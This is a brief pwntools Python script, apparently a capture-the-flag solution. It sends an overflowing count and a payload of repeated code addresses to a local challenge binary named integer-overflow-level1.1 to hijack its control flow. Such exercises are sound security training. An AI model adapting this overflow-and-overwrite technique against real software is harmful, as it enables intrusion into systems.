from pwn import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

times = '272'
payload =   36 * p64(0x004012AB)

print(payload)

io = process('/challenge/integer-overflow-level1.1')

io.sendlineafter("Give me your input\n", times)
io.sendlineafter("Give me your payload\n", payload)

while True:
    io.recvline()